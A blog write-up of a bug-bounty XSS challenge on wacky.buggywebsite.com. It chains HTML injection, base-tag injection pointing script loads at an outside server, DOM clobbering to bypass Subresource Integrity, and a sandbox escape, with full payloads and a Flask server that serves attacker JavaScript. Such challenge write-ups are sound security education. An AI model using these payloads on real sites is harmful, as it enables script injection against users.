---
layout: post
title:  "Wacky XSS challenge writeup"
description: In this writeup I will show my solution for Wacky XSS challenge.
---
Hi, here is my writeup of bugpoc's XSS challenge so we had a URL wacky.buggywebsite.com which shows this page.


![image](../../../assets/images/wacky-xss-1.png){: .imagePopup}


Here we had a textbox where we could enter text and it shows text with some fancy style but we were not allowed to enter some characters such as <, >, &, %, *


we had two JS file one was script.js and another was frame-analytics.js. In script.js we had


```javascript
var isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
	if (!isChrome){
		document.body.innerHTML = `
			<h1>Website Only Available in Chrome</h1>
			<p style="text-align:center"> Please visit <a href="https://www.google.com/chrome/">https://www.google.com/chrome/</a> to download Google Chrome if you would like to visit this website</p>.
		`;
	}
	
document.getElementById("txt").onkeyup = function(){
	this.value = this.value.replace(/[&*<>%]/g, '');
};


document.getElementById('btn').onclick = function(){
	val = document.getElementById('txt').value;
	document.getElementById('theIframe').src = '/frame.html?param='+val;
};

```


due to the replace function in above some special characters were replacing but here we could see that we have another file frame.html with a parameter so I opened it and I saw that value of parameter was reflecting in the title of webpage


![image](../../../assets/images/wacky-xss-2.png){: .imagePopup}


and also it was not filter means we have html injection so after closing the title tag we could execute HTML code. Now here we could not execute JavaScript directly because their was CSP (Content Security policy) so I started analyzing CSP and found that base-uri was missing.


*What can attacker do when base-uri is missing from CSP and we have a html injection?*


*Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain.*


![image](../../../assets/images/wacky-xss-3.png){: .imagePopup}


I hope you got the use of base tag from above image. Lets confirm this in challenge so I added base tag in parameter


![image](../../../assets/images/wacky-xss-4.png){: .imagePopup}


Here movie.pm4 was loading from evil.com. Now we had to load JavaScript file from our server and frame.html should be in iframe because if its not in iframe then frame-analytics.js will not load so I created payload to load JS file from another domain


```
Payload : </title></head><body><iframe src='https://wacky.buggywebsite.com/frame.html?param=aman</title><base href=//evil.com>' id='theIframe' name=iframe></iframe></body></html><!--
```


![image](../../../assets/images/wacky-xss-5.png){: .imagePopup}


and We were able to load frame-analytics.js from another domain. Now I setup my flask server to load my JavaScript code.


```python
from flask import Flask, request, send_from_directory, Response
from flask_cors import CORS, cross_origin


app = Flask(__name__, static_url_path='')
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

@app.route("/files/<path:path>")
@cross_origin()
def exploit(path):
    jscode = """
    alert(document.domain);
        """;
    return Response(jscode, mimetype='application/javascript')

if __name__ == '__main__':
    app.run(debug=True)
```


![image](../../../assets/images/wacky-xss-6.png){: .imagePopup}


Now the response in console was different and It was giving error because of Subresource Integrity in script tag.


***Subresource Integrity (SRI)** is a security feature that enables browsers to verify that resources they fetch (for example, from a CDN) are delivered without unexpected manipulation. It works by allowing you to provide a cryptographic hash that a fetched resource must match.*


Its means we had to change the integrity attribute’s value also to load our script so I started looking for source code and found this.


```javascript
window.fileIntegrity = window.fileIntegrity || {
	'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
	'algorithm' : 'sha256',
	'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
	'creationtime' : 1602687229
}


// securely add the analytics code into iframe
script = document.createElement('script');
script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
script.setAttribute('crossorigin', 'anonymous');
analyticsFrame.contentDocument.body.appendChild(script);
```


If you don’t understand this then let me explain. This code is checking If value of window.fileIntegrity is assigned then use that value to generate script tag with integrity’s value window.fileIntegrity.value and fileIntegrity was a global variable.


so after this we had to use Dom Clobbering technique to control the global variable fileIntegrity


***DOM clobbering** is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.*


It was easy to bypass this SRI using Dom Clobbering so I used anchor tag with id and name to control integrity’s value.


```
paylaod : <a id=fileIntegrity><a id=fileIntegrity name=value href=theamanrawat>
```


this payload will defined the value of window.fileintegrity and we were able to load our JavaScript code.


![image](../../../assets/images/wacky-xss-7.png){: .imagePopup}


Now alert was blocked because of sandbox in iframe so we had to bypass this and bypassing this sandbox was very simple because we can execute JavaScript function such as createElement(), console.log() and etc..


To bypass this I created script tag outside the sandbox iframe and my final payload was this


```
</title></head><body><iframe src='https://wacky.buggywebsite.com/frame.html?param=aman</title><a id=fileIntegrity><a id=fileIntegrity name=value href=theamanrawat><base href=//myserver.com>' id='theIframe' name=iframe></iframe></body></html><!--
```


I sent this payload and the alert was executed :)


![image](../../../assets/images/wacky-xss-8.png){: .imagePopup}


# Now its time to create working PoC on bugpoc.


I used **mock endpoint builder** for JavaScript code


![image](../../../assets/images/wacky-xss-9.png){: .imagePopup}


and then **Flexible Redirector** for redirecting all path to mock endpoint.


Now I created front end poc to run the exploit.


![image](../../../assets/images/wacky-xss-10.png){: .imagePopup}


That’s it for this writeup. You can check the my PoC on https://bugpoc.com/poc#bp-uvrG5pXO & password : `SHYwasp53`


Thanks for reading.
